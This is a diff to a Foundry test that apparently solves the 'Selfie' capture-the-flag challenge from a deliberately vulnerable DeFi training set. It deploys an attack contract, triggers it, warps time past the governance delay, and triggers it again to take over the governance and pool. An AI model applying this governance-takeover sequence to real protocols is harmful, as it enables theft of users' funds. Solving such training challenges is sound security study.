@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
+import {SimpleGovernanceAttack} from "../../../src/Contracts/selfie/SimpleGovernanceAttack.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
 contract Selfie is Test {
@@ -47,7 +48,14 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        SimpleGovernanceAttack simpleGovernanceAttack = new SimpleGovernanceAttack(
+            address(simpleGovernance),
+            address(selfiePool)
+        );
+        simpleGovernanceAttack.attack();
+        vm.warp(block.timestamp + 2 days); // governance ACTION_DELAY_IN_SECONDS
+        simpleGovernanceAttack.attack2();
         /**
          * EXPLOIT END *
          */
